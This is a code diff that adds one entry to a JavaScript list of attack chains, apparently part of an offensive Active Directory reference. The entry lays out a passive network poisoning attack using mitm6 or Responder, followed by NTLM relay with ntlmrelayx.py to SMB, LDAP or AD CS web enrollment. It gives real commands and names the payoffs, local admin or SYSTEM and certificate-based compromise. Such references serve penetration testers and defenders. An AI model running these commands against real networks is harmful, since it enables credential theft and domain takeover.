@@ -5105,6 +5105,37 @@ const CHAINS = [
       ],
     },
   },
+
+  // ---------------- Batch 6: passive poisoning as a relay entry point (no coercion vuln needed) ----------------
+  {
+    id: "mitm6-relay",
+    title: "mitm6 / Responder → NTLM Relay → SMB / LDAP / ADCS",
+    category: "credread",
+    summary:
+      "Every relay chain elsewhere in this reference starts from actively coercing a specific vulnerable service — this is the passive alternative: just being on the network is enough, no coercion bug required at all.",
+    root: {
+      label: "mitm6 — become the network's IPv6 DNS server",
+      note: "or Responder for LLMNR/NBT-NS poisoning on IPv4-only segments",
+      command: "mitm6 -d $DOMAIN",
+      children: [
+        {
+          label: "Windows' IPv6-preferred behavior sends auth your way",
+          note: "hosts querying WPAD/DNS get pointed at the attacker",
+          children: [
+            {
+              label: "Relay the captured NTLM authentication",
+              command: "ntlmrelayx.py -tf targets.txt -smb2support",
+              children: [
+                { label: "Relay to SMB", note: "→ local admin/SYSTEM on any target without SMB signing enforced" },
+                { label: "Relay to LDAP instead", note: "→ see the Coercion → NTLM Relay → LDAP chains for the Shadow Credentials/RBCD payoff — identical relay target, passive entry point" },
+                { label: "Relay to AD CS web enrollment instead", note: "→ see the Coercion → Relay → ADCS ESC8 chain — same certificate payoff, no PetitPotam needed" },
+              ],
+            },
+          ],
+        },
+      ],
+    },
+  },
 ];
 
 // Flattens every label/note/command in a chain's node tree into one
